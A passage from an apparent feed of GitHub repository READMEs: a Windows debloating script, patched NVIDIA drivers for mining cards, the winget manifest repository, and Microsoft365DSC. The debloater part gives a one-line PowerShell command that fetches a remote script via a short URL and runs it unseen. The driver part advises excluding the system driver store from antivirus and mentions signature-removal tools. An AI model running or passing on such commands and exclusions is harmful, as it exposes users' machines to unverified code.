&lt;h2&gt;The scheduled tasks that are disabled are&lt;/h2&gt; 
&lt;p&gt;XblGameSaveTaskLogon, XblGameSaveTask, Consolidator, UsbCeip, DmClient&lt;/p&gt; 
&lt;p&gt;These scheduled tasks that are disabled have absolutely no impact on the function of the OS.&lt;/p&gt; 
&lt;h2&gt;Bloatware that is removed&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://www.microsoft.com/en-us/p/3d-builder/9wzdncrfj3t6&quot;&gt;3DBuilder&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/actipro-universal-windows-controls/9wzdncrdlvzp&quot;&gt;ActiproSoftware&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/windows-alarms-clock/9wzdncrfj3pr?activetab=pivot:overviewtab&quot;&gt;Alarms&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/connector/9wzdncrdjmlj?activetab=pivot:overviewtab&quot;&gt;Appconnector&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/asphalt-8-racing-game-drive-drift-at-real-speed/9wzdncrfj26j?activetab=pivot:overviewtab&quot;&gt;Asphalt8&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/autodesk-sketchbook/9nblggh4vzw5&quot;&gt;Autodesk SketchBook&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/msn-money/9wzdncrfhv4v?activetab=pivot:overviewtab&quot;&gt;MSN Money&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/food-and-drink/9nblggh0jhqg&quot;&gt;Food And Drink&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/health-fitness-free/9wzdncrcwcdp&quot;&gt;Health And Fitness&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/microsoft-news/9wzdncrfhvfw#activetab=pivot:overviewtab&quot;&gt;Microsoft News&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/msn-sports/9wzdncrfhvh4?activetab=pivot:overviewtab&quot;&gt;MSN Sports&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/msn-travel/9wzdncrfj3ft?activetab=pivot:overviewtab&quot;&gt;MSN Travel&lt;/a&gt;, &lt;a href=&quot;https://www.microsoft.com/en-us/p/msn-weather/9wzdncrfj3q2?activetab=pivot:overviewtab&quot;&gt;MSN Weather&lt;/a&gt;, BioEnrollment, &lt;a href=&quot;https://www.microsoft.com/en-us/p/windows-camera/9wzdncrfjbbg#activetab=pivot:overviewtab&quot;&gt;Windows Camera&lt;/a&gt;, CandyCrush, CandyCrushSoda, Caesars Slots Free Casino, ContactSupport, CyberLink MediaSuite Essentials, DrawboardPDF, Duolingo, EclipseManager, Facebook, FarmVille 2 Country Escape, Flipboard, Fresh Paint, Get started, iHeartRadio, King apps, Maps, March of Empires, Messaging, Microsoft Office Hub, Microsoft Solitaire Collection, Microsoft Sticky Notes, Minecraft, Netflix, Network Speed Test, NYT Crossword, Office Sway, OneNote, OneConnect, Pandora, People, Phone, Phototastic Collage, PicsArt-PhotoStudio, PowerBI, Royal Revolt 2, Shazam, Skype for Desktop, SoundRecorder, TuneInRadio, Twitter, Windows communications apps, Windows Feedback, Windows Feedback Hub, Windows Reading List, XboxApp, Xbox Game CallableUI, Xbox Identity Provider, Zune Music, Zune Video.&lt;/p&gt; 
&lt;h2&gt;Quick download link&lt;/h2&gt; 
&lt;p&gt;&lt;code&gt;iwr -useb https://git.io/debloat|iex&lt;/code&gt;&lt;/p&gt; 
&lt;h2&gt;Allowlist and Blocklist&lt;/h2&gt; 
&lt;p&gt;There may be some confusion, but when using the Allowlist/Blocklist, the checkmark means it is on the blocklist, and that it will be removed.&lt;/p&gt; 
&lt;h2&gt;Credits&lt;/h2&gt; 
&lt;p&gt;Thank you to &lt;a href=&quot;https://github.com/a60wattfish&quot;&gt;a60wattfish&lt;/a&gt;, &lt;a href=&quot;https://raw.githubusercontent.com/Sycnex/Windows10Debloater/master/abulgatz&quot;&gt;abulgatz&lt;/a&gt;, &lt;a href=&quot;https://github.com/xsisbest&quot;&gt;xsisbest&lt;/a&gt;, &lt;a href=&quot;https://github.com/Damian&quot;&gt;Damian&lt;/a&gt;, &lt;a href=&quot;https://github.com/Vikingat-RAGE&quot;&gt;Vikingat-RAGE&lt;/a&gt;, Reddit user &lt;a href=&quot;https://github.com/GavinEke&quot;&gt;/u/GavinEke&lt;/a&gt;, and all of the contributors (&lt;a href=&quot;https://github.com/Sycnex/Windows10Debloater/graphs/contributors&quot;&gt;https://github.com/Sycnex/Windows10Debloater/graphs/contributors&lt;/a&gt;) for the suggestions, code, changes, and fixes that you have all graciously worked hard on and shared! You all have done a fantastic job!&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>dartraiden/NVIDIA-patcher</title>
      <link>https://github.com/dartraiden/NVIDIA-patcher</link>
      <description>&lt;p&gt;Adds 3D acceleration support for P106-090 / P106-100 / P104-100 / P104-101 / P102-100 / CMP 30HX / CMP 40HX / CMP 50HX / CMP 70HX / CMP 90HX / CMP 170HX mining cards as well as RTX 3060 3840SP, RTX 3080 Ti 20 GB, RTX 4070 10 GB, and L40 ES.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;NVIDIA patched drivers&lt;/h1&gt; 
&lt;p&gt;Adds 3D acceleration support for P106-090 / P106-100 / P104-100 / P104-101 / P102-100 / CMP 30HX / CMP 40HX / CMP 50HX / CMP 70HX / CMP 90HX / CMP 170HX mining cards as well as RTX 3060 3840SP, RTX 3080 Ti 20 GB, RTX 4070 10 GB, and L40 ES.&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/branded.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt; 
&lt;h1&gt;Donation&lt;/h1&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/donate.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt; If you like my project, please press &quot;Star&quot; in the top right corner. You can also donate me some money:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://boosty.to/dartraiden/donate&quot;&gt;Boosty&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://yoomoney.ru/to/410014777525134&quot;&gt;YooMoney&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://donate.webmoney.com/w/Dns9GDPvvlgw2pFUqf1pff&quot;&gt;WebMoney&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Crypto: 
  &lt;ul&gt; 
   &lt;li&gt;BTC: bc1qakj06mgfcv8ypqeg38d6svwpefxluz90scmwvd&lt;/li&gt; 
   &lt;li&gt;LTC: ltc1qmhvewg7zjmmjw2uuyl37g26vxjjpywteppt6s9&lt;/li&gt; 
   &lt;li&gt;ETH: 0xf27585a4d02ac0308297621fac33763cd100c9f0&lt;/li&gt; 
   &lt;li&gt;USDT (Ethereum, ERC-20): 0xf27585a4d02ac0308297621fac33763cd100c9f0&lt;/li&gt; 
   &lt;li&gt;XMR (Monero): 86kq7awBWZKQt6ndJFJSdNEkAZzZQp6Fz4ToenTLNNjmGZS83LUbWEL9xtem3jwTy23KGfZr2sqK5TH5gy7bFr53QY5RN1D&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Security and transparency&lt;/h2&gt; 
&lt;p&gt;You can remove digital signatures from my files (use &lt;a href=&quot;https://github.com/SV-Foster/UnSign&quot;&gt;UnSign &lt;/a&gt; or &lt;a href=&quot;https://dennisbabkin.com/sigremover/&quot;&gt;SigRemove&lt;/a&gt;). Repeat this with the original files from the NVIDIA distribution. Compare the files byte by byte (&lt;code&gt;fc /b original.dll patched.dll&lt;/code&gt;). You will see that the files are identical, only a small number of bytes have changed. In this regard, I can&#39;t remove the &quot;virus&quot; (which doesn&#39;t exist) from the driver. Please report the false positive to your antivirus manufacturer.&lt;/p&gt; 
&lt;h2&gt;Usage&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://mysku.club/blog/taobao/70663.html&quot;&gt;Click here&lt;/a&gt; if you need Russian translation.&lt;/p&gt; 
&lt;p&gt;It&#39;s recommended to use Windows 11 because it has an updated mechanism for switching between multiple video cards.&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Download patched files from &lt;a href=&quot;https://github.com/dartraiden/NVIDIA-patcher/releases&quot;&gt;releases&lt;/a&gt; (you can find an archive of previous versions &lt;a href=&quot;https://disk.yandex.ru/d/5LO4wqy177XZyw&quot;&gt;here&lt;/a&gt;).&lt;/li&gt; 
&lt;/ol&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/dartraiden/NVIDIA-patcher/releases/latest&quot;&gt;latest&lt;/a&gt; — if you want to use your card paired with any AMD/Intel graphic or any supported NVIDIA discrete graphic.&lt;/li&gt; 
 &lt;li&gt;472.12 — if you want to use a mining card paired with an old NVIDIA discrete graphic (GeForce 600 Series, GeForce GT 710-740, GeForce GTX 760-780 Ti).&lt;/li&gt; 
 &lt;li&gt;446.14 — if you want to use a mining card (only PXXX, not CMP-cards) in the SLI setup (see &lt;a href=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/#SLI-hack&quot;&gt;SLI hack&lt;/a&gt;).&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;The patched driver comes in two versions:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Regular;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;NVENC-NvFBC-&lt;/code&gt; prefixed (&lt;a href=&quot;https://github.com/keylase/nvidia-patch/tree/master/win&quot;&gt;removed&lt;/a&gt; restriction on maximum number of simultaneous NVENC video encoding; &lt;a href=&quot;https://github.com/keylase/nvidia-patch/tree/master/win/nvfbcwrp&quot;&gt;enabled&lt;/a&gt; NvFBC for all NvFBC-targeted applications).&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Attention: Do not use NVENC- prefixed package if your mining card does not have hardware NVENC support. In this case driver will cause problems (crashes) in applications supporting NVENC.&lt;/strong&gt;&lt;/p&gt; 
&lt;ol start=&quot;2&quot;&gt; 
 &lt;li&gt;Download the official driver package from the NVIDIA website.&lt;/li&gt; 
 &lt;li&gt;Download &lt;a href=&quot;https://www.wagnardsoft.com/display-driver-uninstaller-ddu-&quot;&gt;Display Driver Uninstaller&lt;/a&gt; (DDU).&lt;/li&gt; 
 &lt;li&gt;Unpack the official driver package with 7-Zip / WinRAR / etc.&lt;/li&gt; 
 &lt;li&gt;Replace original files with patched ones.&lt;/li&gt; 
 &lt;li&gt;Unplug the network cable / disable Wi-Fi on your PC and clean the installed NVIDIA driver with DDU. Reboot PC.&lt;/li&gt; 
 &lt;li&gt;Run setup.exe.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;During installation, you can select the option &quot;Spoof GPU name&quot; so that the graphics adapter appears in the device manager with the name of the corresponding gaming video card.&lt;/p&gt; 
&lt;p&gt;Result:&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/GPU-Z.png&quot; alt=&quot;Screenshot of GPU-Z window&quot; /&gt;&lt;/p&gt; 
&lt;p&gt;Now you can plug in the network cable / enable Wi-Fi back.&lt;/p&gt; 
&lt;p&gt;8.1. In Windows 10 open the NVIDIA control panel → 3D settings → Manage 3D settings → set &quot;High-performance NVIDIA processor&quot; as the preferred graphics processor:&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/NVIDIA%20Manage%203D%20Settings.jpg&quot; alt=&quot;Screenshot of NVIDIA control panel&quot; /&gt; &lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/High%20Performance%20NVIDIA%20Processor.jpg&quot; alt=&quot;Screenshot of &amp;quot;High-performance NVIDIA processor&amp;quot; option&quot; /&gt;&lt;/p&gt; 
&lt;p&gt;8.2. In Windows 11 open Settings → System → Display → Graphics → Change default graphic settings → set mining card as the default high-performance graphic adapter:&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/Windows%20Default%20High-performance%20GPU.png&quot; alt=&quot;Screenshot of &amp;quot;Default High-performance GPU&amp;quot; option&quot; /&gt;&lt;/p&gt; 
&lt;h2&gt;SLI hack&lt;/h2&gt; 
&lt;p&gt;It is possible to pair together different GPUs of similar generation/architecture to work together in SLI (Note: Mixing different VRAM sizes may cause some instability or stop SLI from functioning properly). It can also enable SLI on some non-SLI/Crossfire compatible motherboards, making it a replacement for the discontinued HyperSLI program (Note: The SLI support on non-multi-GPU motherboards is not guaranteed).&lt;/p&gt; 
&lt;p&gt;Mandatory requirements:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Driver version 446.14 (exactly this version).&lt;/li&gt; 
 &lt;li&gt;The first three symbols of Device ID for both cards must match. Go to Windows Device Manager → Right-click on device → Properties → Switch to the &quot;Details&quot; tab → Select &quot;Hardware IDs&quot; from the combo box.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;As an example:&lt;br /&gt; NVIDIA_DEV.&lt;code&gt;118&lt;/code&gt;5.098A.10DE = &quot;NVIDIA GeForce GTX 660&quot;&lt;br /&gt; NVIDIA_DEV.&lt;code&gt;118&lt;/code&gt;5.106F.10DE = &quot;NVIDIA GeForce GTX 760&quot;&lt;/p&gt; 
&lt;p&gt;Thus, for example, GTX 1070 and GTX 1080 can work together, but GTX 960 and GTX 1060 cannot.&lt;/p&gt; 
&lt;h2&gt;Troubleshooting&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Problem: Antivirus software removes driver.&lt;br /&gt; Solution: Add the &lt;code&gt;C:\Windows\System32\DriverStore&lt;/code&gt; directory to the exceptions of Windows Defender (or other antivirus you use). Reinstall the driver after that.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Problem: A BSOD after installing the driver.&lt;br /&gt; Solution: Turn off the &lt;a href=&quot;https://www.howtogeek.com/756935/how-to-enable-hardware-accelerated-gpu-scheduling-in-windows-11/#enable-hardware-accelerated-gpu-scheduling-in-windows-11&quot;&gt;Hardware Accelerated GPU Scheduling&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;If you don&#39;t trust me and want to patch the driver by yourself, see &lt;a href=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/README-PATCHER.md&quot;&gt;how to use patcher&lt;/a&gt;.&lt;/h1&gt; 
&lt;h2&gt;Unlocking full x16 PCI-E lines on the CMP-cards&lt;/h2&gt; 
&lt;p&gt;TL;DR: You need to solder the missing elements near the PCI-E slot.&lt;/p&gt; 
&lt;p&gt;English: &lt;a href=&quot;https://www.youtube.com/watch?v=AlLid4uGxpw&quot;&gt;https://www.youtube.com/watch?v=AlLid4uGxpw&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Russian: &lt;a href=&quot;https://www.youtube.com/watch?v=twRIYq2p-38&quot;&gt;https://www.youtube.com/watch?v=twRIYq2p-38&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Using ShadowPlay, also known as the NVIDIA overlay&lt;/h2&gt; 
&lt;p&gt;Requires graphics card that supports NVENC.&lt;/p&gt; 
&lt;h3&gt;Recommended method: &lt;a href=&quot;https://www.nvidia.com/en-us/software/nvidia-app/&quot;&gt;NVIDIA App&lt;/a&gt;&lt;/h3&gt; 
&lt;h3&gt;Alternative method: GeForce Experience&lt;/h3&gt; 
&lt;p&gt;To use the ShadowPlay overlay to record gameplay, use the resource monitor or stream, you must follow these steps:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Download and install &lt;a href=&quot;https://www.nvidia.com/en-us/geforce/geforce-experience/download/&quot;&gt;GeForce Experience&lt;/a&gt; (no need to log in).&lt;/li&gt; 
 &lt;li&gt;Go to the installation path of Nvidia GeForce Experience, usually located at &lt;code&gt;C:\Program Files\NVIDIA Corporation\NVIDIA GeForce Experience&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Once there, locate the executable named &quot;NVIDIA Share.exe&quot; and create a shortcut on your desktop.&lt;/li&gt; 
 &lt;li&gt;Right-click on the created desktop shortcut, go to properties, and in the &quot;Target&quot; field at the end of the path, add &lt;code&gt; --shadowplay&lt;/code&gt; while ensuring there&#39;s a space as shown in the picture. Then click OK.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/NVIDIA%20Share%20shortcut.png&quot; alt=&quot;Screenshot of NVIDIA Share shortcut&quot; /&gt;&lt;/p&gt; 
&lt;ol start=&quot;4&quot;&gt; 
 &lt;li&gt;Now double-click on the shortcut, and you&#39;ll notice that nothing appears to happen. However, when you press &lt;code&gt;Alt+Z&lt;/code&gt;, the ShadowPlay overlay will open. Note: You do not need to double-click the shortcut again; this is a one-time setup. From now on, you can always open ShadowPlay by pressing &lt;code&gt;Alt+Z&lt;/code&gt;.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/ShadowPlay.png&quot; alt=&quot;Screenshot of ShadowPlay&quot; /&gt;&lt;/p&gt; 
&lt;h2&gt;DirectX 12 on Haswell&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://www.techpowerup.com/288676/intel-disables-directx-12-api-loading-on-haswell-processors&quot;&gt;https://www.techpowerup.com/288676/intel-disables-directx-12-api-loading-on-haswell-processors&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>microsoft/winget-pkgs</title>
      <link>https://github.com/microsoft/winget-pkgs</link>
      <description>&lt;p&gt;The Microsoft community Windows Package Manager manifest repository&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Windows Package Manager Community Repository&lt;/h1&gt; 
&lt;p&gt;&lt;a href=&quot;https://gitter.im/Microsoft/winget-pkgs&quot;&gt;&lt;img src=&quot;https://img.shields.io/gitter/room/Microsoft/winget-pkgs&quot; alt=&quot;Gitter&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://dev.azure.com/shine-oss/winget-pkgs/_build?definitionId=14&quot;&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https://winget-validation-pme-f8gqfjhzacawbecy.z01.azurefd.net/api/GetServiceComponentStatusBadge?component=ValidationPipeline&quot; alt=&quot;Validation Pipeline Badge&quot; title=&quot;Validation Pipeline Badge&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://dev.azure.com/shine-oss/winget-pkgs/_build?definitionId=12&quot;&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https://winget-validation-pme-f8gqfjhzacawbecy.z01.azurefd.net/api/GetServiceComponentStatusBadge?component=PublishPipeline&quot; alt=&quot;Publish Pipeline Badge&quot; title=&quot;Publish Pipeline Badge&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://www.githubstatus.com&quot;&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https://api.bittu.eu.org/github-status-badge-endpoint&quot; alt=&quot;GitHub Status&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;https://status.dev.azure.com/&quot;&gt;&lt;img src=&quot;https://img.shields.io/badge/dynamic/json?url=https%3A%2F%2Fstatus.dev.azure.com%2F_apis%2Fstatus%2Fhealth%3Fservices%3DPipelines%26geographies%3DUS&amp;amp;query=%24.services%5B0%5D.geographies%5B0%5D.health&amp;amp;label=Azure%20Pipelines%20Status&quot; alt=&quot;Azure Pipelines Status&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;This repository contains the manifest files for the &lt;strong&gt;Windows Package Manager&lt;/strong&gt; default source. You are highly encouraged to submit manifests for your favorite application.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!IMPORTANT] At this time installers must be MSIX, MSI, APPX, or .exe application installers. Script-based installers and fonts are not currently supported.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;The &lt;strong&gt;Windows Package Manager&lt;/strong&gt; is an &lt;a href=&quot;https://github.com/microsoft/winget-cli&quot;&gt;open source client&lt;/a&gt; designed for command-line usage. If you are interested in exploring private repositories offering private WinGet package hosting, see &lt;a href=&quot;https://raw.githubusercontent.com/microsoft/winget-pkgs/master/doc/private/README.md&quot;&gt;private repositories&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;Documentation&lt;/h1&gt; 
&lt;p&gt;Please check the &lt;a href=&quot;https://raw.githubusercontent.com/microsoft/winget-pkgs/master/doc/README.md&quot;&gt;overview&lt;/a&gt; for detailed topics. Common topics for the WinGet Community repository are available below:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/microsoft/winget-pkgs/master/doc/README.md#authoring-a-manifest&quot;&gt;Authoring a manifest&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/microsoft/winget-pkgs/master/doc/README.md#testing-a-manifest&quot;&gt;Testing a manifest&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/microsoft/winget-pkgs/master/doc/README.md#submitting-a-manifest&quot;&gt;Submitting a manifest&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/microsoft/winget-pkgs/master/doc/Issues.md#Request-a-New-Package&quot;&gt;Requesting a new package&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/microsoft/winget-pkgs/master/doc/Issues.md#Request-a-New-Package-Version&quot;&gt;Requesting a new package version&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;Contributing&lt;/h1&gt; 
&lt;p&gt;This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and do, grant us the rights to use your contribution. For details, visit &lt;a href=&quot;https://cla.opensource.microsoft.com&quot;&gt;https://cla.opensource.microsoft.com&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;When you submit a pull request, a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., status check, comment). Follow the instructions provided by the bot. You will only need to do this once across all Microsoft repositories using our CLA.&lt;/p&gt; 
&lt;p&gt;This project has adopted the &lt;a href=&quot;https://opensource.microsoft.com/codeofconduct/&quot;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. See the &lt;a href=&quot;https://opensource.microsoft.com/codeofconduct/faq/&quot;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&quot;mailto:opencode@microsoft.com&quot;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments. More information is available in our &lt;a href=&quot;https://raw.githubusercontent.com/microsoft/winget-pkgs/master/CONTRIBUTING.md&quot;&gt;Contributing document&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;To avoid doubt, you may not make any Submissions linking to third-party materials if such Submission is prohibited by the applicable third party and/or otherwise violates such third party&#39;s rights.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>microsoft/Microsoft365DSC</title>
      <link>https://github.com/microsoft/Microsoft365DSC</link>
      <description>&lt;p&gt;Manages, configures, extracts and monitors Microsoft 365 tenant configurations&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Microsoft365DSC&lt;/h1&gt; 
&lt;p&gt;This module allows organizations to automate the deployment, configuration, reporting and monitoring of Microsoft 365 Tenants via PowerShell Desired State Configuration. The compiled configuration needs to be executed from an agent&#39;s Local Configuration Manager (LCM) (machine or container) which can communicate back remotely to Microsoft 365 via remote API calls (therefore requires internet connectivity)&lt;/p&gt; 
&lt;p&gt;For information on how to get started, additional documentation or additional resources, please navigate to the official web site at &lt;a href=&quot;http://Microsoft365DSC.com&quot;&gt;Microsoft365DSC.com&lt;/a&gt; and check out the official YouTube channel &lt;a href=&quot;https://www.youtube.com/channel/UCveScabVT6pxzqYgGRu17iw&quot;&gt;Microsoft365DSC&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Branches&lt;/h2&gt; 
&lt;h3&gt;master&lt;/h3&gt; 
&lt;p&gt;&lt;a href=&quot;https://codecov.io/gh/Microsoft/Microsoft365DSC&quot;&gt;&lt;img src=&quot;https://codecov.io/gh/Microsoft/Microsoft365DSC/branch/master/graph/badge.svg?sanitize=true&quot; alt=&quot;codecov&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;This is the branch containing the latest release. No contributions should be made directly to this branch.&lt;/p&gt; 
&lt;h3&gt;dev&lt;/h3&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/CodeCoverage.yml&quot;&gt;&lt;img src=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/CodeCoverage.yml/badge.svg?sanitize=true&quot; alt=&quot;Code Coverage&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/AzureCloud%20-%20Full-Circle%20-%20EXO.yml&quot;&gt;&lt;img src=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/AzureCloud%20-%20Full-Circle%20-%20EXO.yml/badge.svg?sanitize=true&quot; alt=&quot;AzureCloud - Full-Circle - EXO&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/AzureCloud%20-%20Full-Circle%20-%20O365.yml&quot;&gt;&lt;img src=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/AzureCloud%20-%20Full-Circle%20-%20O365.yml/badge.svg?sanitize=true&quot; alt=&quot;AzureCloud - Full-Circle - O365&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/AzureCloud%20-%20Full-Circle%20-%20OD.yml&quot;&gt;&lt;img src=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/AzureCloud%20-%20Full-Circle%20-%20OD.yml/badge.svg?sanitize=true&quot; alt=&quot;AzureCloud - Full-Circle - OD&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/AzureCloud%20-%20Full-Circle%20-%20PP.yml&quot;&gt;&lt;img src=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/AzureCloud%20-%20Full-Circle%20-%20PP.yml/badge.svg?sanitize=true&quot; alt=&quot;AzureCloud - Full-Circle - PP&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/AzureCloud%20-%20Full-Circle%20-%20SC.yml&quot;&gt;&lt;img src=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/AzureCloud%20-%20Full-Circle%20-%20SC.yml/badge.svg?sanitize=true&quot; alt=&quot;AzureCloud - Full-Circle - SC&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/AzureCloud%20-%20Full-Circle%20-%20SPO.yml&quot;&gt;&lt;img src=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/AzureCloud%20-%20Full-Circle%20-%20SPO.yml/badge.svg?sanitize=true&quot; alt=&quot;AzureCloud - Full-Circle - SPO&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/AzureCloud%20-%20Full-Circle%20-%20TEAMS.yml&quot;&gt;&lt;img src=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/AzureCloud%20-%20Full-Circle%20-%20TEAMS.yml/badge.svg?sanitize=true&quot; alt=&quot;AzureCloud - Full-Circle - TEAMS&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/Global%20-%20Integration%20-%20AAD.yml&quot;&gt;&lt;img src=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/Global%20-%20Integration%20-%20AAD.yml/badge.svg?sanitize=true&quot; alt=&quot;Global - Integration - AAD&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/Global%20-%20Integration%20-%20EXO.yml&quot;&gt;&lt;img src=&quot;https://github.com/microsoft/Microsoft365DSC/actions/workflows/Global%20-%20Integration%20-%20EXO.yml/badge.svg?sanitize=true&quot; alt=&quot;Global - Integration - EXO&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
